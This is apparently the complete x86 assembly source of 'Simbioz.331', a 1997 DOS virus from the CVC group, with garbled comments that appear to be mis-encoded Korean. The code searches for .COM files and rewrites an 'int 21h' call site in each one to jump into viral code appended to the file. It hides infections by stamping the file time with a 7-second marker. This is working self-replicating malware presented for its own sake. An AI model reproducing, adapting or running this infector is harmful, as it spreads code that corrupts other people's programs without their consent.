;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; Simbioz.331 virus                                             CVC #01  97/06
;
; ¹A¸b¸a : Reminder [DVC]
; Ðe‹iÍe»³ : Osiris / CVC
; §¡¬wºÑw COM ˆqµq
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

.286                                    ; 286 ·¡¬wµA¬á ¸b•·
.model tiny
.code
org 100h                                ; 100h
start:

lea dx,mess
call virus                              ; ¤a·¡œá¯a ¸b•·
nop
int 20h
mess db 'virii rulez$'                  ; ¡A¯¡»¡

virus:
mov word ptr cs:_bp,bp
pop bp
sub bp,3                                ;
pusha                                   ;
push ds es
call $+3                                ; •IÈa µ¡Ïa­U ŠÐq
pop si                                  ;
sub si,($-virus)-1                      ;

restore_orig_4_bytes:
mov ah,byte ptr cs:[offset orig-offset virus+si ]
mov al,0b4h                             ; 100h µA ¶¥œ •A·¡Èá¡ ¥¢Š ¯¡Ç±
mov cs:[bp],ax
mov cs:[bp+2],21cdh
mov bp,si

get_dta:
mov ah,2fh                              ; DTA ¬é¸÷
int 21h
mov word ptr cs:_dta,bx                 ; ¶¥œ DTA ¸á¸w
mov word ptr cs:_dta,es                 ; ¥¡É· ­A‹a åËa : 0080h ·±

set_dta:
mov ax,cs
add ax,2000h
mov ds,ax
xor dx,dx
mov ah,1ah
int 21h

find_first:
mov ah,4eh                              ; Ìa·© Àx‹¡
mov cx,20h                              ; ­¢¬÷
mov dx,offset fmask-offset virus        ; Àx‰¡¸a Ða“e Ìa·© ·¡Ÿq
add dx,si
push ds cs                              ; cs=ds
pop ds
int 21h
pop ds
find:
jnc save
_er:
jmp er                                  ; µAœá ¤i¬—

find_next:
mov ax,cs
add ax,2000h
mov ds,ax

mov ah,4fh                              ; ”a·q Ìa·© Àx‹¡
int 21h
jmp find

save:
mov ax,ds:[16h]
mov cs:_time,ax                         ; ˆqµq ¯¡Ç© Ìa·©· ¸b¬÷¯¡ ´è·q
and al,01fh
cmp al,7
jz find_next
mov ax,ds:[18h]
mov cs:_date,ax

open_find_file:
mov ax,3d02h                            ; Ìa·© µ¡Ïe
mov dx,1eh
int 21h
jnc read_file
jmp find_next
read_file:
xchg ax,bx                              ; BX = Ìa·© Ð…—i

change_segment:                         ; ­A‹a åËa ¤aŽ‹¡
mov ax,ds
add ax,10h
mov ds,ax

mov ah,3fh                              ; Ìa·© ·ª‹¡
xor dx,dx
mov cx,0f000h
int 21h
jnc search_code
jmp close

search_code:
push ds                                 ; ds=es
pop es
mov cx,ax
mov si,ax
mov di,dx
uuu:
mov al,0b4h
new:
cld
repne scasb                             ; B4h Àx‹¡
jne close
cmp word ptr es:[di+1],21CDh            ; Int 21h ·¥ˆa ?
jne new
great:
mov ax,di
dec ax
mov cx,si
mov si,ax
mov dx,cx
sub dx,ax
sub dx,3

change_code:
mov byte ptr ds:[si],0e8h               ; call ¡ww
mov al,byte ptr ds:[si+1]
mov byte ptr cs:[offset orig - offset virus + bp],al
mov word ptr ds:[si+1],dx               ; º­¡ˆt
in al,42h
mov byte ptr ds:[si+3],al

pointer_to_begin:
push cx
mov ax,4200h                            ; Í¡·¥ÈáŸi Àá·q·a¡ ·¡•·
xor cx,cx
xor dx,dx
int 21h
pop cx
jc close

save_file:
mov ah,40h                              ; ´|¦¦… ³a‹¡ (¤a·¡œá¯a¡ ¸ñÏa)
xor dx,dx
int 21h
jc rest

pointer_to_end:
mov ax,4202h                            ; Ìa·© {·a¡ ·¡•·
xor cx,cx
xor dx,dx
int 21h
jc rest

save_virus:
mov ah,40h                              ; ¤a·¡œá¯a ³a‹¡
mov cx,virlen
push cs
pop ds
mov dx,bp
int 21h
jc rest

change_time_to_7_second:
mov ax,cs:_time                         ; ˆqµq¯¡ˆe ¤aŽ‘
and al,01fh                             ; (¤a·¡œá¯a· ˆqµq µa¦¡ ¬åÈ‚)
add al,7
mov cs:_time,ax

rest:
mov ax,5701h                            ; ¶¥œ ¯¡ˆe·a¡ ¤aŽ‘
mov dx,cs:_date                         ; ·¡˜ Á¡“e ¤a·¡œá¯a 7 Á¡¡ ¤aŽñ
mov cx,cs:_time
int 21h

close:
mov ah,3eh                              ; Ìa·© ”h‹¡
int 21h

jmp find_next

er:
mov ah,1ah                              ; ¶¥œ DTA ¡ ¬é¸÷
lds dx,cs:_dta
int 21h
pop es ds
popa
push bp
mov bp,word ptr cs:_bp
ret

fmask db '*.com',0                      ; *.com Ìa·©
iam db '[Simbioz.Inside]'               ; ¤a·¡œá¯a ·¡Ÿq
_bp equ 0feh
_dta equ 0f0h
_time equ 0f4h
_date equ 0f6h
orig db 9
virlen equ $-virus
end start

